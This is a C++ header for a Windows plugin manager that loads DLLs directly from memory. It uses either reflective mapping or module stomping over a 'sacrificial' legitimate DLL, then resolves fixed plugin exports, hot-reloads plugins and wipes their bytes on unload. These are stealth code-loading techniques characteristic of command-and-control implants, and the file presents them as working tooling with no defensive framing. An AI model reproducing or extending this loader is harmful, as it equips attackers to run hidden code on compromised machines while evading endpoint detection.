#pragma once
#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <unordered_map>
#include <vector>
#include "IPlugin.h"
#include "ReflectiveLoaderEngine.h"
#include "StompedLoaderEngine.h"

#ifdef NDEBUG
#define PMDBG(...) ((void)0)
#else
#define PMDBG(fmt, ...) do { fprintf(stderr, "[PM] " fmt "\n", ##__VA_ARGS__); fflush(stderr); } while(0)
#endif

// ---------------------------------------------------------------------------
// PluginInfo is defined in IPlugin.h (canonical location).
// ---------------------------------------------------------------------------
typedef PluginInfo (__stdcall* PluginInfoFn)();

// ---------------------------------------------------------------------------
enum class LoaderEngine { Reflective, Stomped };

// ---------------------------------------------------------------------------
// Function pointer types for the five required plugin exports.
// ---------------------------------------------------------------------------
using CreatePlugin_t  = IPlugin* (__stdcall*)(const WinApiTable*);
using DestroyPlugin_t = void(__stdcall*)(IPlugin*);
using PluginInit_t    = void(__stdcall*)(IPlugin*);
using PluginExec_t    = void(__stdcall*)(TaskApi*);
using PluginCleanup_t = void(__stdcall*)(IPlugin*);

// ---------------------------------------------------------------------------
// PluginSlot — all state for one loaded plugin.
// ---------------------------------------------------------------------------
struct PluginSlot {
    std::string   id;
    LoaderEngine  engine;

    MemModule     reflectiveMod;
    StompedModule stompedMod;
    std::string   sacrificialDll;

    CreatePlugin_t  fnCreate   = nullptr;
    DestroyPlugin_t fnDestroy  = nullptr;
    PluginInit_t    fnInit     = nullptr;
    PluginExec_t    fnExec     = nullptr;
    PluginCleanup_t fnCleanup  = nullptr;

    IPlugin*      instance    = nullptr;
    bool          initialized = false;

    std::string   pluginName;
    std::string   pluginVersion;

    std::vector<uint8_t> dllBytes;

    SRWLOCK       lock;

    PluginSlot() : engine(LoaderEngine::Reflective) {
        InitializeSRWLock(&lock);
    }
};

// ---------------------------------------------------------------------------
// PluginManager — multi-plugin lifecycle with hot-reload and persistence.
// ---------------------------------------------------------------------------
class PluginManager {
public:
    PluginManager() { InitializeSRWLock(&m_registryLock); }

    ~PluginManager() { UnloadAll(); }

    PluginManager(const PluginManager&) = delete;
    PluginManager& operator=(const PluginManager&) = delete;

    // -- Configuration --------------------------------------------------------

    void SetWinApiTable(const WinApiTable& table) { m_api = table; }
    const WinApiTable& GetWinApiTable() const { return m_api; }

    // -- Load / Unload --------------------------------------------------------

    bool LoadPlugin(const std::string& id,
                    const uint8_t* dllBytes, size_t dllSize,
                    LoaderEngine engine,
                    const char* sacrificialDll = nullptr) {
        if (!dllBytes || dllSize == 0) return false;
        if (engine == LoaderEngine::Stomped && !sacrificialDll) return false;

        AcquireSRWLockExclusive(&m_registryLock);
        if (m_plugins.count(id)) {
            ReleaseSRWLockExclusive(&m_registryLock);
            PMDBG("Plugin '%s' already loaded", id.c_str());
            return false;
        }

        auto& slot = m_plugins[id];
        ReleaseSRWLockExclusive(&m_registryLock);

        AcquireSRWLockExclusive(&slot.lock);
        slot.id     = id;
        slot.engine = engine;
        slot.dllBytes.assign(dllBytes, dllBytes + dllSize);
        if (sacrificialDll) slot.sacrificialDll = sacrificialDll;

        bool ok = LoadIntoSlot(slot);
        if (!ok) {
            ReleaseSRWLockExclusive(&slot.lock);
            AcquireSRWLockExclusive(&m_registryLock);
            m_plugins.erase(id);
            ReleaseSRWLockExclusive(&m_registryLock);
            return false;
        }
        ReleaseSRWLockExclusive(&slot.lock);
        PMDBG("Loaded '%s' (%s engine)", id.c_str(),
              engine == LoaderEngine::Stomped ? "stomped" : "reflective");
        return true;
    }

    bool UnloadPlugin(const std::string& id) {
        AcquireSRWLockExclusive(&m_registryLock);
        auto it = m_plugins.find(id);
        if (it == m_plugins.end()) {
            ReleaseSRWLockExclusive(&m_registryLock);
            return false;
        }

        auto& slot = it->second;
        AcquireSRWLockExclusive(&slot.lock);
        TeardownSlot(slot);
        ReleaseSRWLockExclusive(&slot.lock);
        m_plugins.erase(it);
        ReleaseSRWLockExclusive(&m_registryLock);
        PMDBG("Unloaded '%s'", id.c_str());
        return true;
    }

    // -- Hot-Reload -----------------------------------------------------------

    bool ReloadPlugin(const std::string& id,
                      const uint8_t* newDllBytes, size_t newDllSize) {
        if (!newDllBytes || newDllSize == 0) return false;

        AcquireSRWLockShared(&m_registryLock);
        auto it = m_plugins.find(id);
        if (it == m_plugins.end()) {
            ReleaseSRWLockShared(&m_registryLock);
            return false;
        }
        auto& slot = it->second;
        ReleaseSRWLockShared(&m_registryLock);

        AcquireSRWLockExclusive(&slot.lock);
        TeardownSlot(slot);
        slot.dllBytes.assign(newDllBytes, newDllBytes + newDllSize);
        bool ok = LoadIntoSlot(slot);
        if (!ok) {
            ReleaseSRWLockExclusive(&slot.lock);
            AcquireSRWLockExclusive(&m_registryLock);
            m_plugins.erase(id);
            ReleaseSRWLockExclusive(&m_registryLock);
            return false;
        }
        ReleaseSRWLockExclusive(&slot.lock);
        PMDBG("Reloaded '%s'", id.c_str());
        return true;
    }

    // -- Execute (persistent — plugin stays loaded) ---------------------------

    bool ExecutePlugin(const std::string& id, TaskApi* task) {
        AcquireSRWLockShared(&m_registryLock);
        auto it = m_plugins.find(id);
        if (it == m_plugins.end()) {
            ReleaseSRWLockShared(&m_registryLock);
            return false;
        }
        auto& slot = it->second;
        ReleaseSRWLockShared(&m_registryLock);

        AcquireSRWLockShared(&slot.lock);
        if (!slot.fnExec) {
            ReleaseSRWLockShared(&slot.lock);
            return false;
        }
        task->Api = &m_api;
        slot.fnExec(task);
        ReleaseSRWLockShared(&slot.lock);
        return true;
    }

    // -- Query ----------------------------------------------------------------

    size_t GetPluginCount() const {
        AcquireSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
        size_t n = m_plugins.size();
        ReleaseSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
        return n;
    }

    std::vector<std::string> GetPluginIds() const {
        AcquireSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
        std::vector<std::string> ids;
        ids.reserve(m_plugins.size());
        for (auto& kv : m_plugins)
            ids.push_back(kv.first);
        ReleaseSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
        return ids;
    }

    bool GetPluginInfo(const std::string& id, std::string& name,
                       std::string& version, LoaderEngine& engine) const {
        AcquireSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
        auto it = m_plugins.find(id);
        if (it == m_plugins.end()) {
            ReleaseSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
            return false;
        }
        name    = it->second.pluginName;
        version = it->second.pluginVersion;
        engine  = it->second.engine;
        ReleaseSRWLockShared(const_cast<PSRWLOCK>(&m_registryLock));
        return true;
    }

    // -- Bulk -----------------------------------------------------------------

    void UnloadAll() {
        AcquireSRWLockExclusive(&m_registryLock);
        for (auto& kv : m_plugins) {
            AcquireSRWLockExclusive(&kv.second.lock);
            TeardownSlot(kv.second);
            ReleaseSRWLockExclusive(&kv.second.lock);
        }
        m_plugins.clear();
        ReleaseSRWLockExclusive(&m_registryLock);
        PMDBG("All plugins unloaded");
    }

    void ExecuteAll(TaskApi* task) {
        auto ids = GetPluginIds();
        for (auto& id : ids)
            ExecutePlugin(id, task);
    }

private:
    bool LoadIntoSlot(PluginSlot& slot) {
        if (slot.engine == LoaderEngine::Reflective) {
            slot.reflectiveMod = MapImage(slot.dllBytes.data(), slot.dllBytes.size(), m_api);
            if (!slot.reflectiveMod.base) return false;
        } else {
            slot.stompedMod = StompModule(slot.dllBytes.data(), slot.dllBytes.size(),
                                          slot.sacrificialDll.c_str(), m_api);
            if (!slot.stompedMod.stompedBase) return false;
        }

        if (!ResolveExports(slot)) {
            if (slot.engine == LoaderEngine::Reflective)
                FreeImage(slot.reflectiveMod, m_api);
            else
                FreeStompedModule(slot.stompedMod, m_api);
            return false;
        }

        slot.instance = slot.fnCreate(&m_api);
        if (!slot.instance) return false;
        slot.fnInit(slot.instance);
        slot.initialized = true;
        return true;
    }

    bool ResolveExports(PluginSlot& slot) {
        auto resolve = [&](const char* name) -> void* {
            if (slot.engine == LoaderEngine::Reflective)
                return GetExport(slot.reflectiveMod, name);
            else
                return GetStompedExport(slot.stompedMod, name);
        };

        slot.fnCreate  = (CreatePlugin_t)resolve("create_plugin");
        slot.fnDestroy = (DestroyPlugin_t)resolve("destroy_plugin");
        slot.fnInit    = (PluginInit_t)resolve("plugin_init");
        slot.fnExec    = (PluginExec_t)resolve("plugin_exec");
        slot.fnCleanup = (PluginCleanup_t)resolve("plugin_cleanup");

        if (!slot.fnCreate || !slot.fnDestroy || !slot.fnInit ||
            !slot.fnExec  || !slot.fnCleanup) {
            PMDBG("Missing exports for '%s'", slot.id.c_str());
            return false;
        }

        ProbeMetadata(slot);

        if (slot.engine == LoaderEngine::Stomped)
            FreePrivateMapping(slot.stompedMod, m_api);

        return true;
    }

    void ProbeMetadata(PluginSlot& slot) {
        void* infoFn = nullptr;
        if (slot.engine == LoaderEngine::Reflective)
            infoFn = GetExport(slot.reflectiveMod, "plugin_info");
        else if (slot.stompedMod.privateBase)
            infoFn = GetStompedExport(slot.stompedMod, "plugin_info");

        slot.pluginName    = slot.id;
        slot.pluginVersion = "0.0";

        if (infoFn) {
            auto fn = (PluginInfoFn)infoFn;
            PluginInfo info = fn();
            if (info.name)    slot.pluginName    = info.name;
            if (info.version) slot.pluginVersion = info.version;
        }
    }

    void TeardownSlot(PluginSlot& slot) {
        if (slot.instance && slot.initialized) {
            slot.fnCleanup(slot.instance);
            slot.fnDestroy(slot.instance);
        }
        slot.instance    = nullptr;
        slot.initialized = false;

        if (slot.engine == LoaderEngine::Reflective)
            FreeImage(slot.reflectiveMod, m_api);
        else
            FreeStompedModule(slot.stompedMod, m_api);

        if (!slot.dllBytes.empty()) {
            memset(slot.dllBytes.data(), 0, slot.dllBytes.size());
            slot.dllBytes.clear();
        }

        slot.fnCreate = nullptr; slot.fnDestroy = nullptr;
        slot.fnInit = nullptr; slot.fnExec = nullptr; slot.fnCleanup = nullptr;
    }

    std::unordered_map<std::string, PluginSlot> m_plugins;
    SRWLOCK    m_registryLock;
    WinApiTable m_api = DefaultWinApiTable();
};
